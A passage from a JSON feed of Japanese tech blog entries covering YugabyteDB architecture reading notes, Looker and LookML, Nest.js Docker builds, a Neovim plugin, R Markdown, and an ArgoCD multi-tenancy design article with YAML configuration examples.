Patition...","isoDate":"2023-09-11T01:56:24.000Z","dateMiliSeconds":1694397384000,"authorName":"seno","authorId":"seno"},{"title":"YugabyteDBのドキュメントを全部読む Day8","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/8_core_functions_read_io_path","contentSnippet":"前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Core functions > Write I/O pathを読みました。今回はArchitecture > Core functions > Read I/O pathを読みます。ドキュメントのバージョンは最新のv2.19 previewです。また画像は同ドキュメントより引用しています。Read I/O pathI/O Pathはタブレットリーダーが特定されリード処理を実行する単一キーの例で説明することが出来る。Tablet leader identificationユーザーが発行したYQLクエリレイヤに作用するリードリクエストはポートから適切なAPI(YQLまたはYCQL)を経由して行なわれる。このユーザリクエストはYQLレイヤで内部キーに変換され、YQLレイヤがタブレットとそれをホストするYB-TServerを発見するのに利用される。YQLレイヤはこれをYB-MasterにたしてRPC呼び出しを実行するために行なう。またそのレスポンスは将来の利用のためにキャッシュされる。その後YQLレイヤはリーダータブレットピアーをホストするYB-TServerに対してリード処理を行なう。このリード処理は内部キーを保持するタブレットのRaftグループのリーダーによって処理される。このリードリクエストを処理するRaftグループのリーダーはDocDBから読み込みを実行し、その結果をユーザーに戻す。Write I/O Pathで説明した通り、YugabyteDBのスマートクライアントではアプリケーションのリクエストを直接適切なYB-TServerに送信することが出来るため、余計なネットワークホップやマスターへのアクセスを省略することが出来る。Read operation performed by tablet leaderkという値をKというプライマリキー行に持つテーブルT1からデータを取得するケースについて考える。またテーブルT1はキー行Kと値行Vを持つものとする。1下記の画像はリード処理について説明している。YugabyteDBはデフォルトでは強整合性の読み取りを採用している。リードクエリはさらに複雑になることもある。YQLクエリレイヤーは式やビルトイン関数、算術演算を含むクエリを処理するfully-optimized2されたクエリエンジンを持っている。SELECT K,V from T1 where K = \'k\'ということ↩↩","isoDate":"2023-09-06T18:37:55.000Z","dateMiliSeconds":1694025475000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"LookMLとは","link":"https://zenn.dev/nedoko_dok0dko/articles/18a4a04b98dcb8","contentSnippet":"これは何？Looker内にある機能である「LookML」について調べたことをまとめた個人的備忘録。 LookMLとはLookMLの紹介 \xa0|\xa0 Looker \xa0|\xa0 Google CloudLookML は、Looker Modeling Language の略です。セマンティックデータモデルを作成するためにLookerで使用される言語です。LookMLを使用して、SQLデータベース内のディメンション、集計、計算、およびデータの関係を記述できます。LookMLは「Looker上で利用できる独自の言語」のことをさす　別にMLや機械学習は関係ないLookerは、Lo...","isoDate":"2023-09-05T10:46:35.000Z","dateMiliSeconds":1693910795000,"authorName":"seno","authorId":"seno"},{"title":"Nodejs(Nest.js)のアプリケーションのbuildを高速化、slim化してみようの会","link":"https://zenn.dev/satohjohn/articles/c05d29f5d68e0c","contentSnippet":"前提DockerによるNode.jsのインストール(pull)はキャッシュされているものとする.dockerignoreは以下の通りnode_modules.git.gitignore*.mddisttest 最初にまとめ軽く、そんなに依存関係が多くないアプリケーションであればnpmでstaging buildでキャッシュ効かせるぐらいでよいかもRUN --mount=type=cache,target= は効果がありそうである (https://zenn.dev/kou64yama/articles/powerful-docker-build-cache...","isoDate":"2023-09-02T10:02:16.000Z","dateMiliSeconds":1693648936000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"mini.surroundによるHTMLタグ編集のemmet対応","link":"https://blog.atusy.net/2023/09/01/mini-surround-emmet/","contentSnippet":"mini.surroundはvim-sandwichのような、括弧やクオーテーションなどで囲まれた文字列を編集するためのNeovim向けプラグインです。選択範囲を()で囲う、文字列の囲いを()から\\"\\"に変更する、\\"\\"による囲いを削除するといったことが可能です。同様にHTMLタグに対する操作にも対応していますが素朴なものです。","isoDate":"2023-09-01T00:00:00.000Z","dateMiliSeconds":1693526400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Lookerのユーザー権限について","link":"https://zenn.dev/nedoko_dok0dko/articles/160cb146e72740","contentSnippet":"これは何Lookerのユーザー権限一覧を個人的にまとめたものhttps://cloud.google.com/looker/docs/admin-panel-users-roles?hl=ja#default_permission_sets ユーザー権限一覧Admin:Developer、Viewer、Standard権限に加え、データソースへの接続やユーザー管理の権限を持つ現時点で確認できる、Adminでしかできない機能については以下データソース(BigQuery等)への接続設定ユーザーの追加・削除・権限の変更ユーザー・グループ単位のフォルダの公開・非公...","isoDate":"2023-08-31T17:22:40.000Z","dateMiliSeconds":1693502560000,"authorName":"seno","authorId":"seno"},{"title":"YugabyteDBのドキュメントを全部読む Day7","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/7_core_functions_write_io_path","contentSnippet":"前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Core functions > Table Creationを読みました。今回はArchitecture > Core functions > Write I/O pathを読みます。ドキュメントのバージョンは最新のv2.19 previewです。また画像は同ドキュメントより引用しています。Write I/O pathWrite I/O pathはYQLレイヤーで処理され、タブレットリーダーによってレプリケーションの準備が行なわれるシングルキーでの書き込みとして例示することが出来る。アトミックなアップデートを共なう複数キーでの分散トランザクションなど複雑なケースについては分散トランザクションに記載する。Write operation processing by YQL layerユーザーが発行したYQLクエリレイヤに作用するライトリクエストはポートから適切なAPI(YQLまたはYCQL)を経由して行なわれる。このユーザーリクエストはYQLレイヤで内部キーに変換される。シャーディングで説明するように、それぞれのキーは一つのタブレットが所有する。どのタブレットがキーを所有するか特定するために、YQLレイヤはYB-MasterにRPC1呼び出しを実行する。そのレスポンスは将来の利用のためにキャッシュされる。YugabyteDBはタブレットの場所をキャッシュし直接参照することでネットワークホップを減らすことで、YQLレイヤが直接適切なYB-TServerにホストされるタブレットリーダーにリクエストを送信することが出来るスマートクライアントを持つ。YQLレイヤがローカルノードにタブレットリーダーを見つけた場合、RPCはローカルファンクションコールになりリクエストをシリアライズとデシリアライズしてネットワーク越しに送信する時間を節約することが出来る。その後YQLレイヤはタブレットリーダーをホストするYB-TServerへの書き込みを発行する。この書き込みはキーを所有するRaftグループのタブレットリーダーによって処理される。Preparation of the operation for replication by tablet leader下記の図はタブレットリーダーがレプリケーションを実行する処理を説明している。タブレットのRaft Groupリーダーは以下の処理を実行する。現在実行されている処理が現在のスキーマに対応しているかを判別するキーに対してローカルin-memoryロックマネージャーを利用してロックを取得する。このロック機構はフォロワーには存在しない必要であればデータを読み込む(read-modify-writeや条件付きアップデート命令など)DocDBに書き込まれる変更のバッチを準備する。この書き込みバッチは殆ど最終的にRocksDBに書き込まれるKey-Valueペアに近く、それぞれのキーの末尾に最終的なhybrid timestampが添えられていないだけであるRaft replication of the write operation書き込みのRaftレプリケーション処理の流れは以下のように説明することが出来る。リーダーがバッチをRaft logにアペンドし、書き込みのためのhybrid timestampを選択するRaftを利用しデータをピアーに複製する成功したRaft replicationのデータをローカルのDocDBに反映するユーザーに成功を返すフォロワータブレットはRaftを利用したデータの複製を受けつけ、コミットされた事が分ったタイミングでその複製をローカルのDocDBに反映する。リーダーは以下のようにコミットポイントに於ける後続のRPCリクエストの進行を進める。書き込みバッチを含むRaftエントリーは過半数以上のタブレットRaft Groupピアーに複製されるRaftのサブシステムから\\"Replication Successful\\"のコールバックを取得したあと、リーダーはローカルのDocDBにバッチの書き込みを適用するリーダーからの次の更新でエントリーがコミットされたことがフォロワーに通知され、フォロワーはそれぞれのRocksDBインスタンスにバッチの書き込みを適用する。Response to the clientInformation Pending2Exampleskとvという値をKという行とVという行をもつテーブルT1に挿入する例について考える3。この例ではユーザーアプリケーションがランダムなYugabyteDBサーバにWriteクエリを送信し、そのサーバがリクエストを適切にルーティングすると仮定して簡略化している。特にYCQLではYugabyteDB Smart Clientを使うことで、余分なネットワークホップを避けることが出来る。↩原文ママ。過去のバージョンでも記載無し↩INSERT INTO T1 (K,V) VALUES(\'k\',\'v\')ということ↩","isoDate":"2023-08-30T16:03:36.000Z","dateMiliSeconds":1693411416000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Modifying output format from within R Markdown chunk by `rmarkdown::output_format_dependency`","link":"https://blog.atusy.net/2023/08/28/rmarkdown-output-format-dependency/","contentSnippet":"This article introduces a new feature from rmarkdown 2.24, output_format_dependency().R Markdown users use variety of output formats from variety of packages such as html_document, bookdown::git_book, revealjs::revealjs_presentation, and so onUsually, users specify the YAML frontmatter to choose and tweak formats.output: html_document: toc: trueSome people may be surprised, but the output formats are R functions!And the above example is equivalent to specifying the toc argument to html_document().Output formats already provide customizibility.","isoDate":"2023-08-28T00:00:00.000Z","dateMiliSeconds":1693180800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"YugabyteDBのドキュメントを全部読む Day6","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/6_core_functions_table_creation","contentSnippet":"前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Core functions > Universe creationを読みました。今回はArchitecture > Core functions > Table Creationを読みます。ドキュメントのバージョンは最新のv2.19 previewです。また画像は同ドキュメントより引用しています。Table CrationYugabyteDBではユーザーにより実行されるテーブルの作成はYB-Masterのリーダーが実行する非同期APIによって管理される。YB-MasterはそのAPIでテーブルのスキーマと障害耐性を高めるために形成するRaftグループに所属するYB-Masterでのテーブル作成に必要な他の情報のレプリケーションが完了した段階でAPIの成功を返す。YB-Masterのリーダーがテーブル作成を実行するときは複数のステップが存在する。ValidationYB-Masterリーダーはテーブルスキーマの検証を行ない、指定された数のタブレットを作成する。これらのタブレットはこの段階ではYB-TServerには割り振られていない。ReplicationYB-MasterリーダーはYB-MasterのRaftグループにテーブルスキーマと新しく作成されたタブレット(この時点ではYB-TServerへの割り当て行なわれていない)の複製を行なう。この処理はYB-Masterリーダに障害が発生してもテーブル作成が成功することを保証する。Acknowledgementテーブル作成処理はYB-Masterリーダーに障害が発生しても処理を継続することが出来るため、この段階で非同期テーブル作成APIは成功を返す。ExecutionYB-Masterリーダーはそれぞれのタブレットをレプリケーションファクターとして指定された数だけYB-TServerに割り当てを行なう。このタブレットピアーの配置は指定された障害耐性を実現でき、またタブレットの割り当てがYB-TServerに均等に行なわれるように実行される。タブレットのYB-TServerへの割り当てはタブレットのレプリカが複数クラウド、リージョン、アヴェイラビリティゾーンをまたいで分散するといった追加の制約を満す必要がある。Continuous monitoringYB-Masterリーダーは全てのタブレットの割り当て処理を監視し、その実行状態と完了をユーザーが実行したAPIコールに対して応答する必要がある。Examplesテーブルが4ノードからなるYugabyteDBUniverseに作成される処理について考える。このときテーブルは16のタブレットと3つのレプリケーションファクターを持つとする。YB-Masterリーダーはスキーマを検証する。また16タブレット(合計48のタブレットピアー)を作成し、Raftを利用して過半数のYB-TServerにテーブルの作成に必要なデータを複製する。作成したタブレットをRaftグループを成すYB-TServerの中の指定された数のYB-TServer割り当て、リーダーの選出を行なう。このタブレットに属するキーに対する全てのリードとライトは、タブレットピアーのリーダーとRaftグループが責任を持つ。タブレットが割り当てられると長期に渡る障害か将来のロードバランシングが発生しYB-Masterにオーナーシップを変更されるまで、割り当て先のYB-TServerが所有する。タブレットリーダーをホストするYB-TServerの内の1台に障害が発生した場合、タブレットのRaftグループはI/Oを処理するために即座にリーダーエレクションを実行する。そのためYB-MasterはI/Oにおけるクリティカルパスになることはない。レプリケーション先となる候補を探す。この複製処理は段階的かつGracefulに実行される。","isoDate":"2023-08-23T14:26:45.000Z","dateMiliSeconds":1692800805000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"【ArgoCD\uD83D\uDC19️】KubernetesのマルチテナントパターンとArgoCDの実践テナント設計","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2023/08/18/110646","contentSnippet":"この記事から得られる知識この記事を読むと、以下を \\"完全に理解\\" できます✌️Kubernetesのマルチテナントパターンの種類マルチテナントパターンをArgoCDで実践する場合にオススメのパターン (★で表現)ArgoCDのNamespacedスコープモードとClusterスコープモードArgoCDのテナントが防いでくれる誤った操作の具体例記事のざっくりした内容は、以下のスライドからキャッチアップできちゃいます！    この記事から得られる知識01. はじめに02. なぜマルチテナントが必要なのかシングルテナントの場合マルチテナントの場合03. Kubernetesのマルチテナントパターンマルチテナントパターンの一覧Clusters as-a-ServiceControl Planes as-a-ServiceNamespaces as-a-Serviceカスタムリソーステナント04. ArgoCDでのテナントパターン実践一覧04-02. Clusters as-a-Service 実践実Clusterテナントオススメしない理由04-03. Control Planes as-a-Service 実践仮想Clusterテナント - ★オススメした理由04-04. Namespaces as-a-Service 実践04-05. カスタムリソーステナントの実践AppProjectテナントCLモード vs. NSモード05. CLモードなArgoCDCLモードなArgoCDとはAppProjectArgoCDコンポーネント用ConfigMap (argocd-cmd-params-cm)ログインユーザー用ConfigMap (argocd-rbac-cm)オススメしない理由05-02. NSモードなArgoCD - ★★NSモードなArgoCDとはAppProjectArgoCDコンポーネント用ConfigMap (argocd-cmd-params-cm)ログインユーザー用ConfigMap (argocd-rbac-cm)特にオススメした理由AppProjectテナント例の一覧テナント例1Namespace (プロダクトの実行環境別)、AppProject (プロダクトの実行環境別)オススメしなかった理由テナント例2 - ★Namespace (プロダクト別)、AppProject (プロダクトの実行環境別)オススメした理由テナント例3 - ★★Namespace (プロダクト別)、AppProject (プロダクトのサブチーム別)特にオススメした理由06. どのような誤った操作を防いでくれるのかマニフェストのデプロイ制限マニフェストをデプロイできる場合(\uD83D\uDEAB制限例1) 無認可のNamespaceでApplicationを作成しようとした場合(\uD83D\uDEAB制限例2) 無認可のAppProjectでApplicationを作成しようとした場合(\uD83D\uDEAB制限例3) 無認可のClusterをデプロイ先に指定しようとした場合(\uD83D\uDEAB制限例4) 無認可のNamespaceをデプロイ先に指定しようとした場合カスタムリソースのReconciliation制限ArgoCD系カスタムリソースをReconciliationできる場合(\uD83D\uDEAB制限例1) 無認可のNamespaceにReconciliationを実行しようとした場合07. おわりに謝辞記事関連のおすすめ書籍01. はじめにどうも、熟成アルトバイエルンです。画像引用元：Argo Projectさて最近の業務で、全プロダクトの技術基盤開発チームに携わっており、全プロダクト共有のArgoCD\uD83D\uDC19のマルチテナント化を担当しました。プロダクトが稼働するKubernetes Clusterが数十個あり、Clusterによっては複数のチームが合計100個以上のマイクロサービスを動かしています。このような大規模なマイクロサービスシステムがいくつもある状況下で、ArgoCDのマルチテナント設計の知見を深められたため、記事で解説しました。書きたいことを全部書いたところ、情報量がエグいことになってしまったため、気になる章だけでも拾って帰っていただけるとハッピーです\uD83D\uDE4FKubernetesのマルチテナントパターン (3章)ArgoCDでのテナントパターン実践一覧 (4章)ArgoCDのClusterスコープモードとNamespacedスコープモード (5章)どのような誤った操作を防いでくれるのか (6章)それでは、もりもり布教していきます\uD83D\uDE1702. なぜマルチテナントが必要なのかシングルテナントの場合そもそも、なぜArgoCDにマルチテナントが必要なのでしょうか。例えば、マニフェストのデプロイ先となるプロダクト用Cluster (例：foo、bar、baz) があると仮定します。ArgoCDをシングルテナントにする場合、各プロダクトチームの操作するApplicationを同じテナントに共存させることになります。この場合、単一のargocd-server (ダッシュボード) から全てのApplicationを操作できて便利です。しかし、プロダクト用Cluster数が増えていくにつれて、問題が起こり始めます。例えば、いずれかのプロダクトチームが誤ったApplicationを操作し、結果的に誤ったプロダクト用Clusterにマニフェストをデプロイしてしまう可能性があります。もちろん、システムでインシデントを起こしてやろうという悪意を持った人が、誤ったプロダクト用Clusterを意図的に選ぶ可能性もあります\uD83D\uDE08マルチテナントの場合その一方で、いい感じのマルチテナントにしたとします。プロダクトチームは、認可されたテナントに所属するApplicationにのみを操作でき、反対に無認可のテナントのApplicationは操作できません。これにより、誤ったプロダクト用Clusterにマニフェストをデプロイすることを防げます。03. Kubernetesのマルチテナントパターンマルチテナントパターンの一覧ArgoCDのテナント設計を実践する前に、Kubernetesにはどんなマルチテナントパターンがあるのでしょうか。Kubernetesのマルチテナントパターンは、以下に大別できます。         Clustersas-a-Service         Control Planesas-a-Service         Namespacesas-a-Service         カスタムリソーステナント      テナント単位         実Cluster         仮想Cluster         Namespace         ツール固有の論理空間      テナント間でKubernetesリソースを分離できるか         Clusterスコープリソース         ✅         ✅         ✅         ツールによる      Namespacedスコープリソース         ✅         ✅                  ツールによる      ツール         AWS EKSGCP GKEAzure AKEKubeadmなど         Kcptensile-kubevclusterVirtualClusterなど         Namespaceを増やすだけなので特別なツール不要         ArgoCDのAppProjectCapsuleのTenantkioskのAccountKubeZooのTenantなど      ▶ 他のマルチテナントの分類方法について\\"ソフトマルチテナンシー\\" と \\"ハードマルチテナンシー\\" といった分類方法もあります。この分類方法では、テナント間の分離度の観点で各マルチテナントを種別します。ソフトマルチテナンシーは、互いに信頼できる前提の上で、テナント間を弱く分離します。その一方で、ハードマルチテナンシーは、互いに信頼できない前提の上でテナント間を強く分離します。分離度がソフトとハードのいずれであるかに客観的な指標がなく、やや曖昧な種別になってしまうため、本記事の X as-a-Service の方が個人的には好みです♡♡♡The Kubernetes Book: 2024 Edition (English Edition)Multi-tenancy | KubernetesMulti-tenancy - EKS Best Practices GuidesClusters as-a-ServiceClusters as-a-Serviceは、テナントごとに独立したClusterを提供します。ツールとして、AWS EKS、GCP GKE、Azure AKE、Kubeadmなどがあります。Three Tenancy Models For Kubernetes | KubernetesWhat are the three tenancy models for Kubernetes?Control Planes as-a-ServiceControl Planes as-a-Serviceは、テナントごとに独立したコントロールプレーン (言い換えば仮想Cluster) を提供します。ツールとして、Kcp、tensile-kube、vcluster、VirtualClusterなどがあります。Three Tenancy Models For Kubernetes | KubernetesWhat are the three tenancy models for Kubernetes?Namespaces as-a-ServiceNamespaces as-a-Serviceは、テナントごとに独立したNamespaceを提供します。Namespaceを増やすだけなため、ツールは不要です。Three Tenancy Models For Kubernetes | KubernetesWhat are the three tenancy models for Kubernetes?カスタムリソーステナントカスタムリソーステナントは、テナントごとにツール固有の論理空間 (例：ArgoCDのAppProject、CapsuleのTenant、kioskのAccount、KubeZooのTenantなど) を提供します。ツールによっては、X as-a-Service も兼ねている場合があります。今回紹介するAppProjectは、前述の『Namespace as-a-Service』を兼ねています。AppProjectについては、カスタムリソーステナント で解説しています。04. ArgoCDでのテナントパターン実践一覧お待たせしました。ここからは、KubernetesのマルチテナントパターンをArgoCDで具体的に実践し、おすすめのパターン実践を解説していきます。なお、オススメするものを ★ としています。         実Clusterテナント         仮想Clusterテナント         Namespaceテナント         AppProjectテナントCLモード         AppProjectテナントNSモード      対応するテナントパターン         Clustersas-a-Service         Control Planesas-a-Service         Namespacesas-a-Service         カスタムリソーステナント      ArgoCDがテナント間で占有 / 共有         占有         占有         占有         共有         占有      テナント間でKubernetesリソースを分離できるか         Namespacedスコープリソース         ✅         ✅         ✅         ✅         ✅      Clusterスコープリソース         ✅         ✅                                 オススメ                  ★                           ★★      How many do you need? Argo CD Architectures Explained - 2024 Update | Akuity以降の図の凡例です。ArgoCDの各コンポーネント (application-controller、argocd-server、dex-server、repo-server) と各リソース (Application、AppProject) を区別しています。04-02. Clusters as-a-Service 実践実Clusterテナント実Clusterテナントは、Clusters as-a-Serviceなテナントの実践であり、実際のClusterをテナントの単位とします。後述の仮想Clusterと対比させるために、\\"実Cluster\\" と呼ぶことにします。各プロダクトチームは、実Clusterテナント内のApplicationを操作し、正しいプロダクト用Clusterにマニフェストをデプロイします。オススメしない理由実Clusterテナントには、以下のメリデメがあります。デメリットの回避策も考慮して、独断と偏見でオススメしませんでした。半年以内にアップグレードしないとサポートが切れるKubernetesクラスターが33個もあって、泣いちゃった— 長谷川 広樹 (俺です) (@Hiroki__IT) January 18, 2023  アーキテクチャ特性  メリット ⭕️                                                                                                                                                           デメリット \xd7                                                                                    デメリットの回避策                                                                                  拡張性                 -                                                                                                                                                                     テナントを増やすために実Clusterを用意する必要があり、作業量が多い。                            ➡︎  IaCツールで実Clusterを用意するようにすれば作業量を減らせるが、やっぱりとてもつらい\uD83D\uDE2D       安全性(セキュリティ)        ClusterからClusterへの名前解決を不可能にすれば、他のテナントからの通信を遮断できる。                                                                                  -                                                                                              ➡︎  -                                                                                                   保守性                 ClusterスコープまたはNamespacedスコープなKubernetesリソースを他のテナントから分離できる。これらのKubernetesリソース (特にCRD) の変更が他のテナントに影響しない。  各テナントが、個別に実Clusterを保守しないといけない。(例：アップグレード、機能修正など)  ➡︎  回避できず、とてもつらい\uD83D\uDE2D                                                                           性能                  Clusterのハードウェアリソースを他のテナントと奪い合うことなく、これを独占できる。                                                                                     -                                                                                              ➡︎  -                                                                                                   信頼性                 テナントごとに実Clusterが独立しており、他の実Clusterから障害の影響を受けない。                                                                                        -                                                                                              ➡︎  -                                                                                    04-03. Control Planes as-a-Service 実践仮想Clusterテナント - ★仮想Clusterテナントは、Control Planes as-a-Serviceなテナントの実践であり、仮想Clusterをテナントの単位とします。各プロダクトチームは、仮想Clusterテナント内のApplicationを操作し、正しいプロダクト用Clusterにマニフェストをデプロイします。Using Argo CD with vclusters. Managing deployment to multiple… | by Daniel Helfand | Argo Projectオススメした理由仮想Clusterテナントには、以下のメリデメがあります。デメリットの回避策も考慮して、独断と偏見で オススメ しました。 アーキテクチャ特性  メリット ⭕️                                                                                                                                                           デメリット \xd7                                                                                             デメリットの回避策                                                                                    拡張性                 テナントを増やすためにマニフェストで定義した仮想Clusterを用意するだけでよく、実Clusterを用意することと比べて作業量が少ない。                                          -                                                                                                       ➡︎  -                                                                                            安全性(セキュリティ)        仮想ClusterからホストClusterへの名前解決を不可能にすれば、他のテナントからの通信を遮断できる。                                                                        -                                                                                                       ➡︎  -                                                                                                     保守性                 ClusterスコープまたはNamespacedスコープなKubernetesリソースを他のテナントから分離できる。これらのKubernetesリソース (特にCRD) の変更が他のテナントに影響しない。  各テナントが、個別に仮想Clusterを保守しないといけない。(例：アップグレード、機能修正など)  ➡︎  仮想Clusterに関する知見を持つ組織であれば、各テナントで保守できる。                                    性能                  -                                                                                                                                                                     Clusterのハードウェアリソースを他のテナントと奪い合うことになる。                                       ➡︎  多くの利用者が同時並行的にArgoCDを操作する状況になりにくければ、奪い合いも起こらない。                信頼性                 テナントごとに仮想Clusterが独立しており、他の仮想Clusterから障害の影響を受けない。                                                                                    -                                                                                                       ➡︎  -                                                                                      04-04. Namespaces as-a-Service 実践Namespaceテナントは、Namespaces as-a-Serviceなテナントの実践であり、Namespaceをテナントの単位とします。後述の AppProjectテナント は二重のテナントを持ち、Namespaceテナントも兼ねています。そのため、ここではNamespaceテナントの解説は省略します。04-05. カスタムリソーステナントの実践AppProjectテナントAppProjectテナントは、カスタムリソーステナントの実践であり、NamespaceとAppProjectをテナントの単位とします。AppProjectテナントは、二重のテナント (第一テナントにNamespace、第二テナントに複数のAppProject) を持ち、\\"あらゆる面から\\" マニフェストのデプロイを制限します。特に、AppProjectはNamespaceスコープなカスタムリソースであり、自身に所属するApplicationを一括して制限します。apiVersion: argoproj.io/v1alpha1kind: AppProjectmetadata:  name: foo-tenant  namespace: foo  # 自身に所属するApplicationを制限するspec: ...apiVersion: argoproj.io/v1alpha1kind: Applicationmetadata:  name: infra-application  namespace: foospec:  # foo-tenantに所属する  project: foo-tenant  ...Argo CD in Practice: The GitOps way of managing cloud-native applications (English Edition)Projects - Argo CD - Declarative GitOps CD for Kubernetes▶ カスタムリソースの仕様について.spec.scopeキーからも分かる通り、AppProjectはNamespacedスコープなカスタムリソースであり、任意のNamespaceを設定できます\uD83D\uDC4DapiVersion: apiextensions.k8s.io/v1kind: CustomResourceDefinitionmetadata:  labels:    app.kubernetes.io/name: appprojects.argoproj.io    app.kubernetes.io/part-of: argocd  name: appprojects.argoproj.iospec:  group: argoproj.io  names:    kind: AppProject    ...  # Namespacedスコープなカスタムリソースであるとわかる  scope: Namespaced...  argo-cd/manifests/crds/appproject-crd.yaml at master \xb7 argoproj/argo-cd \xb7 GitHubExtend the Kubernetes API with CustomResourceDefinitions | KubernetesCLモード vs. NSモードArgoCDには、Clusterスコープモード と Namespacedスコープモード (以降、\\"CLモード\\" と \\"NSモード\\") があります。スコープモードに応じて、AppProjectテナントの設計方法が異なります。本章では、CLモードとNSモードの両方でAppProjectテナントを解説していきます。Applications in any namespace - Argo CD - Declarative GitOps CD for Kubernetes05. CLモードなArgoCDCLモードなArgoCDとはCLモードなArgoCDの場合、各テナント間で共有のArgoCDを管理します例えば、AppProjectテナントとして、プロダクト別のNamespace (foo、bar、baz) とAppProject (foo、bar、baz) を用意します。別途、ArgoCD専用のNamespace (argocd) を用意し、ここに関連するKubernetesリソース (例：ConfigMap) を配置します。各プロダクトチームは、AppProjectテナント内のApplicationを操作し、正しいプロダクト用Clusterにマニフェストをデプロイします。Applications in any namespace - Argo CD - Declarative GitOps CD for KubernetesArgoCD: Multi-tenancy strategy. Introduction | by Geoffrey | MediumAppProjectNSモードと同様にして、AppProjectに所属するApplicationによるマニフェストのデプロイを制限できます。例えば、以下のような実装になります。apiVersion: argoproj.io/v1alpha1kind: AppProjectmetadata:  name: foo-tenant  namespace: foospec:  destinations:    # ArgoCD用Clusterに関する認可を設定する    # App Of Appsパターンの場合に使用する    - namespace: foo      server: \\"https://kubernetes.default.svc\\"    # プロダクト用Clusterに関する認可を設定する    - namespace: \\"*\\"      server: https://foo-cluster.gr7.ap-northeast-1.eks.amazonaws.com  # CLモードでは設定が必要である  sourceNamespaces:    - fooApplicationを操作するログインユーザーが、無認可のNamespaceやClusterをデプロイ先に指定できないように、.spec.destinationキーで制限しています。一方で後述のNSモードとは異なり、CLモードなArgoCDは任意のNamespaceのApplicationにアクセスできます。そのため、.spec.sourceNamespacesキーで、特定のNamespaceのApplicationがこのAppProjectに所属できないように、ApplicationのNamespaceを制限しています。Applications in any namespace - Argo CD - Declarative GitOps CD for KubernetesProjects - Argo CD - Declarative GitOps CD for KubernetesArgoCDコンポーネント用ConfigMap (argocd-cmd-params-cm)NSモードと同様にして、argocd-cmd-params-cmでは、ArgoCDの各コンポーネントのコンテナの引数を設定できます。例えば、以下のような実装になります。apiVersion: v1kind: ConfigMapmetadata:  name: argocd-cmd-params-cm  # 専用のNamespaceを設定する  namespace: argocddata:  # CLモードでは設定が必要である  # 全てのNamespaceを指定したい場合は、ワイルドカードを設定する  application.namespaces: \\"*\\".application.namespacesキーは、argocd-serverとapplication-controllerの--application-namespacesオプションに相当します。一方での後述のNSモードとは異なり、CLモードなArgoCDは任意のNamespaceのApplicationにアクセスできます。--application-namespacesオプションで、任意のNamespaceにアクセスするための認可を設定できます。Applications in any namespace - Argo CD - Declarative GitOps CD for Kubernetes▶ --application-namespacesオプションの設定方法についてargocd-cmd-params-cmの代わりに、例えば以下のようにPodに引数を直接渡しても良いです\uD83D\uDE46\uD83C\uDFFB‍例えば、以下のような実装になります。apiVersion: v1kind: Podmetadata:  name: argocd-server  namespace: argocdspec:  containers:    - name: argocd-server      image: quay.io/argoproj/argocd:latest      args:        - /usr/local/bin/argocd-server        # コンテナ起動時の引数として        - --application-namespaces=\\"*\\"  ...apiVersion: v1kind: Podmetadata:  name: argocd-application-controller  namespace: argocdspec:  containers:    - name: argocd-application-controller      image: quay.io/argoproj/argocd:latest      args:        - /usr/local/bin/argocd-application-controller        # コンテナ起動時の引数として        - --application-namespaces=\\"*\\"  ...  `argocd-application-controller` Command Reference - Argo CD - Declarative GitOps CD for Kubernetes`argocd-server` Command Reference - Argo CD - Declarative GitOps CD for Kubernetesログインユーザー用ConfigMap (argocd-rbac-cm)NSモードと同様にして、argocd-rbac-cmでは、Applicationを操作するログインユーザーが、無認可のAppProjectやNamespaceに所属するApplicationを操作できないように制限します。例えば、以下のような実装になります。apiVersion: v1kind: ConfigMapmetadata:  name: argocd-rbac-cm  # 専用のNamespaceを設定する  namespace: argocddata:  # デフォルトのロール  # @see https://github.com/argoproj/argo-cd/blob/master/assets/builtin-policy.csv#L9-L16  policy.default: role:readonly  policy.csv: |    p, role:foo, *, *, foo/*/*, allow    p, role:bar, *, *, bar/*/*, allow    p, role:baz, *, *, baz/*/*, allow    g, foo-team, role:foo    g, bar-team, role:bar    g, baz-team, role:baz  scopes: \\"[groups]\\"認証済みグループ (foo-team、bar-team、baz-team) に対して、無認可のAppProject (foo、bar、baz) に所属するApplicationを操作できないように、認可スコープを制限しています。▶ AppProjectの認可定義の記法についてCasbin の記法を使用します。今回の実装例で使用したp (パーミッション) とg (グループ) では、以下を記法を使用できます\uD83D\uDC4DapiVersion: v1kind: ConfigMapmetadata:  name: argocd-rbac-cm  namespace: argocddata:  policy.default: role:readonly  policy.csv: |    # ロールとArgoCD系カスタムリソースの認可スコープを定義する    p, role:<ロール名>, <Kubernetesリソースの種類>, <アクション名>, <AppProject名>/<ApplicationのNamespace名>/<Application名>, <許否>    # 認証済みグループにロールを紐付ける    g, <グループ名>, role:<ロール名>  scopes: \\"[groups]\\"RBAC Configuration - Argo CD - Declarative GitOps CD for Kubernetesオススメしない理由CLモードなArgoCDのAppProjectテナントには、以下のメリデメがあります。デメリットの回避策も考慮して、独断と偏見でオススメしませんでした。 アーキテクチャ特性  メリット ⭕️                                                                                  デメリット \xd7                                                                                                                                                                                                                      デメリットの回避策                                                                                                                                                            拡張性                 テナントを増やすためにNamespaceとAppProjectを用意するだけでよく、作業量が少ない。            -                                                                                                                                                                                                                                ➡︎  -                                                                                                                                                                    安全性(セキュリティ)        NetworkPolicyでNamespace間の名前解決を不可能にすれば、他のNamespaceからの通信を遮断できる。  -                                                                                                                                                                                                                                ➡︎  -                                                                                                                                                                             保守性                 ArgoCD用Clusterの管理者が単一のClusterを保守すればよい。(例：アップグレード、機能修正など)   AppProjectはNamespacedスコープなカスタムリソースのため、ClusterスコープなKubernetesリソースを他のテナントと共有しないといけない。そのため、ClusterスコープなKubernetesリソース (特にCRD) の変更は全てのテナントに影響する。  ➡︎  ArgoCDのアップグレード時 (CRDの変更時) 